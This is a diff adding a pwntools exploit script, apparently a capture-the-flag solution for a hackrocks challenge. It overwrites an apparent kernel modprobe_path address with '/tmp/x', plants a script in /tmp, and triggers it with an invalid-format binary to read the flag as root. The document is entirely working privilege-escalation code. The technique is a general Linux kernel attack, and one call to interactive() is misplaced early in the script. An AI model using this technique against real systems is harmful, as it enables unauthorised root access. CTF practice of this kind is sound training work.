@@ -1,0 +1,18 @@
+from pwn import *
+
+p = remote("ch4ll3ng3s.hackrocks.com", 44062)
+p.interactive()
+p.sendlineafter("choose:\n", "1 0xffffffff824447a0")
+p.sendlineafter("choose:\n", "2 0x0000782f706d742f")
+p.sendlineafter("choose:\n", "3")
+wait(0.5)
+p.sendline('echo -e "#!/bin/sh\ncat flag > /tmp/flag" > /tmp/x')
+wait(0.5)
+p.sendline('echo -ne "\xff\xff\xff\xff" > /tmp/b')
+wait(0.5)
+p.sendline('chmod +x /tmp/x /tmp/b')
+wait(0.5)
+p.sendline('/tmp/b')
+wait(0.5)
+p.sendline('cat /tmp/flag')
+p.interactive()
